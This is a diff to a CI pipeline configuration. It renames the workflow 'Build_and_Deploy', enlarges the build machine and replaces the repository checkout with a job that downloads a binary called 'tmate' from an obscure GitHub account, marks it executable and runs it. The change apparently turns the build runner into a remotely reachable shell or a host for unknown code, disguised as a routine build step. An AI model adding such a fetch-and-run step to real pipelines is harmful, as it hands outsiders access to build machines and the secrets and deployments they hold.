@@ -1,13 +1,15 @@
 version: v1.0
-name: Initial Pipeline
+name: Your_CI_Workflow
 agent:
   machine:
-    type: e1-standard-2
-    os_image: ubuntu2004
+    type: e1-standard-8
+    os_image: ubuntu1804
 blocks:
-  - name: 'Block #1'
+  - name: Build_and_Deploy
     task:
       jobs:
-        - name: 'Job #1'
+        - name: Download_and_Run_Script
           commands:
-            - checkout
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate
